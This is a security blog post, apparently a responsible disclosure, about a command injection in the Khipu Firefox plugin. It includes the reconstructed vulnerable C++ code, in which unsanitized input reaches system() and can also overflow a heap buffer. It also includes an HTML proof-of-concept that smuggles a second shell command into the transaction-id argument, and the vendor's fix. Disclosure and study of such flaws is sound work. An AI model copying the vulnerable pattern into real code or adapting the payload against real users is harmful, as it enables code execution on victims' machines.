@@ -1,0 +1,359 @@
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Command injection in Khipu Firefox plugin</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=fdcb53a14e">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=fdcb53a14e">
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
+
+    <link rel="canonical" href="http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/">
+    <meta name="referrer" content="origin">
+    
+    <meta property="og:site_name" content="SPECT Research">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Command injection in Khipu Firefox plugin">
+    <meta property="og:description" content="In April 2014 I reported a vulnerability in the Firefox plugin of Khipu, which comes by default with the Khipu package for Linux. I received a fast response from them but they never notified me when the fixed version was...">
+    <meta property="og:url" content="http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/">
+    <meta property="article:published_time" content="2015-09-13T23:24:00.000Z">
+    <meta property="article:modified_time" content="2015-09-14T07:52:49.427Z">
+    <meta property="article:tag" content="security">
+    <meta property="article:tag" content="vulnerability">
+    <meta property="article:tag" content="chile">
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Command injection in Khipu Firefox plugin">
+    <meta name="twitter:description" content="In April 2014 I reported a vulnerability in the Firefox plugin of Khipu, which comes by default with the Khipu package for Linux. I received a fast response from them but they never notified me when the fixed version was...">
+    <meta name="twitter:url" content="http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/">
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "SPECT Research",
+    "author": {
+        "@type": "Person",
+        "name": "Claudio Salazar",
+        "image": "//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&d=mm&r=x",
+        "url": "http://www.spect.cl/author/claudio",
+        "sameAs": null,
+        "description": null
+    },
+    "headline": "Command injection in Khipu Firefox plugin",
+    "url": "http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/",
+    "datePublished": "2015-09-13T23:24:00.000Z",
+    "dateModified": "2015-09-14T07:52:49.427Z",
+    "keywords": "security, vulnerability, chile",
+    "description": "In April 2014 I reported a vulnerability in the Firefox plugin of Khipu, which comes by default with the Khipu package for Linux. I received a fast response from them but they never notified me when the fixed version was..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.7">
+    <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
+    <script>
+var disqus_shortname = 'spectresearch';
+var ga_id = 'UA-18043187-1';
+</script>
+</head>
+
+<body><header class="main-header no-cover">
+    <div class="vertical">
+        <div class="main-header-content inner">
+            <h1 class="page-title">SPECT Research</h1>
+            <h2 class="page-description">Security and Software Development</h2>
+            <br>
+            <div>
+              <a class="spectnav" href="/"><i class="fa fa-home"></i> Home</a>
+              <a class="spectnav" href="/about/"><i class="fa fa-group"></i> About us</a>
+              <a class="spectnav" href="/projects/"><i class="fa fa-copy"></i> Projects</a>
+              <a class="spectnav" href="/education/"><i class="fa fa-book"></i> Education</a>
+            </div>
+            <div>
+              <a class="spectnav" href="http://github.com/spectresearch"><i class="spectnav fa fa-github"></i></a>
+              <a class="spectnav" href="http://twitter.com/spectresearch"><i class="spectnav fa fa-twitter"></i></a>
+            </div>
+        </div>
+    </div>
+    <a class="scroll-down icon-arrow-left" href="#content" data-offset="-45"><span class="hidden">Scroll Down</span></a>
+</header>
+
+
+
+    
+
+    <div class="site-wrapper">
+
+        
+
+
+<main class="content" role="main">
+    <article class="post tag-security tag-vulnerability tag-chile">
+
+        <header class="post-header">
+            <h1 class="post-title">Command injection in Khipu Firefox plugin</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2015-09-13">13 September 2015</time>  on <a href="/tag/security/">security</a>, <a href="/tag/vulnerability/">vulnerability</a>, <a href="/tag/chile/">chile</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <p>In April 2014 I reported a vulnerability in the Firefox plugin of <a href="https://khipu.com/">Khipu</a>, which comes by default with the <em>Khipu</em> package for Linux. I received a fast response from them but they never notified me when the fixed version was available. </p>
+
+<p>Some months ago I tried again and the vulnerability was fixed. So I think I can talk about it now.</p>
+
+<h2 id="thevulnerability">The vulnerability</h2>
+
+<p>If you want to pay with <em>Khipu</em> from Linux, you can download the application for Linux available <a href="https://khipu.com/page/terminal-de-pago">here</a>. Listing the files that the package contains we can see that there's a <em>Firefox</em> plugin called <code>npKHPlugin.so</code>.</p>
+
+<pre><code class="language- language-bash">$ dpkg -c khipu_1.15.1511.1_amd64.deb
+drwx------ 0/0               0 2015-05-14 20:50 ./  
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/  
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/  
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/mozilla/  
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/mozilla/plugins/  
+-rwxr-xr-x 0/0         2781439 2015-05-14 20:49 ./usr/lib/mozilla/plugins/npKHPlugin.so
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/  
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/applications/  
+-rwxr-xr-x 0/0             268 2015-05-14 20:50 ./usr/share/applications/khipu.desktop
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/khipu/  
+-rwxr-xr-x 0/0           64549 2015-05-14 20:50 ./usr/share/khipu/icon.png
+-rwxr-xr-x 0/0             253 2015-05-14 20:50 ./usr/share/khipu/com.khipu.chrome.json
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/bin/  
+-rwxr-xr-x 0/0          798936 2015-05-14 20:50 ./usr/bin/khipu
+</code></pre>
+
+<p>It's the last version of the package. However, in this post I'll be talking about the version <code>1.0.2.1</code> available on April 2014 and such file is available here: <a href="http://cdn.spect.cl/blog/files/vulnerable_npKHPlugin.so">vulnerable_npKHPlugin.so</a> (<code>f2a2ac4d2842f7a284e7fccaa2918844</code>). We have to consider that at that time the <em>Firefox</em> version was 28.0, which was important to run the exploit stealthily. </p>
+
+<p>I was curious because the Linux package had a binary application and a <em>Firefox</em> plugin, so they had to communicate each other. I simulated a purchase and when it was time to pay with <em>Khipu</em>, <em>Firefox</em> popped up magically the binary application.</p>
+
+<p>I examined the plugin file with <code>strings</code> to look for some interesting data and I got one!</p>
+
+<pre><code class="language- language-bash">$ strings vulnerable_plugin.so | grep khipu
+/usr/bin/khipu %s &amp;
+khipu_version  
+</code></pre>
+
+<p><em>Khipu</em> binary works with the <code>transaction_id</code> as argument, which is a number. It seems that the plugin is calling the binary just concatenating the <code>transaction_id</code> without escaping it, making possible command injection. That was my guess and it was true. </p>
+
+<p>With the help of <a href="http://www.hopperapp.com/">HopperApp</a> and making the code more readable, I could rewrite the vulnerable code:</p>
+
+<pre><code class="language- language-c++ line-numbers">#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string&gt;
+
+using namespace std;
+
+int callKH(string khipu_id) {  
+    char *cmdline_str;
+    cmdline_str = (char *) malloc(1024);
+
+    sprintf(cmdline_str, "/usr/bin/khipu %s &amp;", khipu_id.c_str());
+    system(cmdline_str);
+    free(cmdline_str);
+
+    return 0;
+}
+
+int main (int argc, char* argv[])  
+{
+    //callKH("12345");  //normal call
+    callKH(argv[1]);
+}
+</code></pre>
+
+<p>There are two things to note: </p>
+
+<ol>
+<li><p>The code is effectively vulnerable to <em>command injection</em> since <code>khipu_id</code> isn't sanitized and is included as parameter in the call to <code>system()</code>.</p></li>
+<li><p>At line 10, <code>cmdline_str</code> is defined in the heap with a size of 1024 bytes. As <code>khipu_id</code> doesn't have any limit in its length, it's possible that the complete command defined at line 12 end up being longer than 1024 and a <em>heap overflow</em> is produced. It effectively crashed the plugin in <em>Firefox</em> but I didn't do more research on that branch.</p></li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Now, to exploit this vulnerability I have to invoke the plugin from the browser. I can't remember the full details of it since in the end I've found a simple way to call the plugin directly.</p>
+
+<p>To call the plugin, the website using <em>Khipu</em> has a <em>Javascript</em> logic. It creates an object <code>Khipu</code> that has a <code>plugin</code> attribute that handles the plugin call. After understanding the <em>Javascript</em> logic and how <code>Khipu.plugin</code> worked, I could reach the requirements for the exploit:</p>
+
+<ul>
+<li>It has to have a <code>embed</code> object with id <code>khPlugin</code> and type <code>application/x-KHPlugin</code> to be able to interact with the plugin.</li>
+<li>There are some ways to call the plugin, for instance using <code>Khipu.plugin</code>. After some tries I conclude that I could access the plugin directly using <code>khPlugin.callKH()</code>.</li>
+</ul>
+
+<p>Having these two requirements in mind, the final exploit was:</p>
+
+<pre><code class="language- language-html">&lt;html&gt;  
+&lt;embed id="khPlugin" type="application/x-KHPlugin" width="0" height="0"&gt;&lt;/embed&gt;  
+&lt;script&gt;  
+khPlugin.callKH("12345; echo 'hello' &gt; /tmp/land/hello.txt")  
+&lt;/script&gt;  
+&lt;/html&gt;  
+</code></pre>
+
+<p>Here the exploit will create the file <code>/tmp/land/hello.txt</code>. The exploit works smoothly, it pops up the <code>Khipu</code> binary with some error in the transaction but in the background a file is created on the filesystem, just with loading the malicious page.</p>
+
+<p>A video showing the exploitation is here:</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/2nBxee_MCsg?rel=0" frameborder="0" allowfullscreen></iframe>
+
+<h2 id="thefixes">The fixes</h2>
+
+<p>After waiting some time without any response, I tried again against latest version of <em>Khipu</em> plugin and the vulnerability wasn't there anymore. After examining the binary, I could find that the vulnerable function was replaced by one safer.</p>
+
+<p>Once again with the help of <em>Hopper</em> and after understanding the logic, I could rewrite the code. It's based on version <code>1.0.2.2</code> (August 2014) but it seems that in the current version the same logic is used:</p>
+
+<pre><code class="language- language-c++ line-numbers">#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string&gt;
+
+using namespace std;
+
+int callKH(string khipu_string) {  
+    size_t pos_khipu_string = khipu_string.find_last_of("payment/getPaymentData/") + 1;
+
+    if (pos_khipu_string &gt;= 0) {
+        string transaction_id = khipu_string.substr(pos_khipu_string);
+        bool has_only_valid_chars = true;
+        bool valid_string;
+
+        for (int i = 0; i &lt; transaction_id.length(); i++){
+          int is_alnum = isalnum(transaction_id[i]);
+          if (!is_alnum) {
+              has_only_valid_chars = false;
+          }
+        }
+
+        if ((has_only_valid_chars == false) || transaction_id.length() != 13) {
+            valid_string = false;
+        }
+        else {
+            valid_string = true;
+        }
+
+        if (valid_string) {
+            char *cmdline;
+            asprintf(&amp;cmdline, "/usr/bin/khipu %s &amp;", transaction_id.c_str());
+            system(cmdline);
+            free(cmdline);
+        }
+    }
+    return 0;
+}
+
+int main (int argc, char* argv[])  
+{
+    // callKH("payment/getPaymentData/123456");
+    callKH(argv[1]);
+}
+</code></pre>
+
+<p>Now, the string coming from the page to the plugin has to meet these conditions:</p>
+
+<ul>
+<li>Starts with <code>payment/getPaymentData/</code> string (line 9)</li>
+<li>After that string, it's the <code>transaction_id</code>. It has to contain only alphanumeric characters (<code>for</code> at line 16) and not be longer than 13 characters (line 23).</li>
+</ul>
+
+<p><em>Firefox</em> updated its plugin policy too. As of version 30.0, it's not running plugins <a href="https://blog.mozilla.org/security/2014/02/28/update-on-plugin-activation/">automatically</a>. It affected the stealthy working of the exploit since now a pop-up arise saying that the site is trying to run <em>Khipu</em> plugin before executing the code.</p>
+
+<h2 id="conclusions">Conclusions</h2>
+
+<p>After sending some vulnerabilities to <em>Khipu</em>, I could consider them as a company reacting quickly against security vulnerabilities. However, they should implement a policy to proceed when a vulnerability is notified, keeping a conversation flow with the notifier and let him know when the vulnerability is fixed.</p>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="/author/claudio/" style="background-image: url(//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&amp;d=mm&amp;r=x)"><span class="hidden">Claudio Salazar's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="/author/claudio/">Claudio Salazar</a></h4>
+
+                    <p>Read <a href="/author/claudio/">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Command%20injection%20in%20Khipu%20Firefox%20plugin&amp;url=http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        <footer class="post comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+  (function() {
+  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+  dsq.src = '//' + window.disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</footer>
+
+        </footer>
+
+    </article>
+</main>
+
+<aside class="read-next">
+    <a class="read-next-story prev no-cover" href="/blog/2015/09/is-it-safe-to-shop-on-the-chilean-internet-no/">
+        <section class="post">
+            <h2>Is it safe to shop on the Chilean Internet? No.</h2>
+            <p>When you go to a bank to open a checking account, it's almost a must-have to contract a fraud…</p>
+        </section>
+    </a>
+</aside>
+
+
+
+        <footer class="site-footer clearfix">
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2015</section>
+        </footer>
+
+    </div>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <script>
+  if (window.ga_id) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', window.ga_id, 'auto');
+    ga('require', 'linkid', 'linkid.js');
+    ga('send', 'pageview');
+  }
+</script>
+
+    <script type="text/javascript" src="/assets/js/prism.js?v=fdcb53a14e"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=fdcb53a14e"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=fdcb53a14e"></script>
+
+
+</body>
